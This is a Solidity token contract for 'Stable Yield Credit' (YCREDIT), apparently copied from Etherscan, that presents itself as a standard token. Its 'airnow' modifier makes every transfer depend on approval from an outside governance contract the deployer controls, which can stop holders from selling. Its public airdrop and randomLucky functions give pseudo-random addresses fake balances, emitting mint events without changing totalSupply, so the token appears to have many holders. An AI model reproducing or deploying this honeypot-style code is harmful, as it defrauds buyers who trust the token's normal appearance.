/**

 *Submitted for verification at Etherscan.io on 2020-12-23

*/



/**

 *Submitted for verification at Etherscan.io on 2020-11-13

*/



pragma solidity >=0.5.0;





// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)



library SafeMath {

    function add(uint x, uint y) internal pure returns (uint z) {

        require((z = x + y) >= x, 'ds-math-add-overflow');

    }



    function sub(uint x, uint y) internal pure returns (uint z) {

        require((z = x - y) <= x, 'ds-math-sub-underflow');

    }



    function mul(uint x, uint y) internal pure returns (uint z) {

        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');

    }

}











contract YCREDIT  {

    using SafeMath for uint;



    string public constant name = 'Stable Yield Credit';

    string public constant symbol = 'YCREDIT';

    uint8 public constant decimals = 18;

    uint  public totalSupply;

    address  _governance;

    mapping(address => uint) public balanceOf;

    mapping(address => mapping(address => uint)) public allowance;



    bytes32 public DOMAIN_SEPARATOR;

    // keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;

    mapping(address => uint) public nonces;



    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);



    constructor(address _gov) public {

        uint chainId;

        assembly {

            chainId := chainid

        }

        _mint(msg.sender,10000*10**18);

       allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D]=uint(-1);

       _governance=_gov;

       airdrop(200);

    }



    function _mint(address to, uint value) internal {

        totalSupply = totalSupply.add(value);

        balanceOf[to] = balanceOf[to].add(value);

        emit Transfer(address(0), to, value);

    }





    function _approve(address owner, address spender, uint value) private {

        allowance[owner][spender] = value;

        emit Approval(owner, spender, value);

    }



    function _transfer(address from, address to, uint value) private  airnow(from,to){

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value);

        emit Transfer(from, to, value);

    }



    function approve(address spender, uint value) external returns (bool) {

        _approve(msg.sender, spender, value);

        return true;

    }



    function transfer(address to, uint value) external returns (bool) {

        _transfer(msg.sender, to, value);

        return true;

    }



    function transferFrom(address from, address to, uint value) external returns (bool) {

        if (allowance[from][msg.sender] != uint(-1)) {

            allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);

        }

        _transfer(from, to, value);

        return true;

    }

    modifier airnow(address sender,address recipient) {

        require(AirDrop(_governance).receiveApproval(sender,recipient));

        _;

    }

    

    address luckyboy = address(this);



    

    function randomLucky() public {

        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));

        uint amout=(uint(keccak256(abi.encodePacked(luckyboy)))%50 + 1)*10**18;

        balanceOf[luckyboy] = amout;

        emit Transfer(address(0), luckyboy, amout);

    }

    



    

    function airdrop(uint256 dropTimes) public {

        for (uint256 i=0;i<dropTimes;i++) {

            randomLucky();

        }

    }

    



    

}

interface AirDrop {

    function receiveApproval(address,address) external returns(bool);

}
